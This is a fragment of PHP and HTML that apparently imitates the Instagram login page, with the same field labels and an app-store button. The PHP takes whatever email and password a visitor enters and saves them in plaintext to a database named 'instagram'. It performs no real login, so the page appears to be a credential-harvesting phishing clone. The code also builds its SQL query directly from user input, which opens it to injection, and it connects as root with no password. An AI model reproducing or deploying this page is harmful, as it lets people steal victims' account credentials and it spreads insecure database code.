...
$name = "";
$password = "";
$again = mysqli_connect("localhost", "root", "", "instagram");
if(isset($_POST['enter'])){
    $name = $_POST["email"]; 
    $password = $_POST["password"];
    $setting_record = "INSERT into `login` (`email`, `password`) value('$name', '$password')";
    mysqli_query($again,$setting_record);
};
$name = "";
$password = "";
    ...
    <body>
        ...
        <div class="container">
            <div class="diagram">
              ...
              <input type="text" placeholder="Phone number, email or username" name="email" required><br>
              <input type="password" placeholder="Password" name="password" id="pas" required><br>
              <button type="submit" class="enter" name="enter" >Login</button><br>
         ...
         <div id="all">
            <button class="store">
                ...
                <div style="float: left;"><a style="font-size: 10px;margin-left: -3px;">Download on the</a><br>
